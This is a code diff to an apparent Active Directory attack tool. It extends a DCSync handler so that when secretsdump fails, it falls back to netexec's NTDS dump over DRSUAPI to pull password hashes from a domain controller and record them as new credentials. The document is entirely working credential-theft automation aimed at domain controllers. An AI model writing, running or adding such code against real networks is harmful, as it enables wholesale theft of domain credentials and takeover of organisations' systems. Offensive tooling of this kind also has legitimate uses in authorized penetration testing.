@@ -104,7 +104,26 @@ class DCSyncHandler(BaseEdgeHandler):
         )
 
         if not result["success"]:
-            return False, f"DCSync failed: {result.get('error', 'unknown')}", []
+            # Fallback: netexec DCSync (smb --ntds drsuapi). Same DRSUAPI
+            # replication primitive via a different implementation.
+            self.logger.info(
+                "secretsdump DCSync failed (%s); falling back to netexec --ntds",
+                result.get("error", "unknown"),
+            )
+            from pathstrike.tools import netexec_wrapper as nxc
+
+            nxc_result = await nxc.ntds_dump(
+                dc_host, self._get_nxc_auth_args(principal), method="drsuapi"
+            )
+            if nxc_result.get("success") and nxc_result.get("hashes"):
+                result = nxc_result
+            else:
+                return (
+                    False,
+                    f"DCSync failed: {result.get('error', 'unknown')} "
+                    f"(netexec --ntds fallback: {nxc_result.get('error', 'no hashes')})",
+                    [],
+                )
 
         hashes: dict[str, str] = result.get("hashes", {})
         new_creds: list[Credential] = []
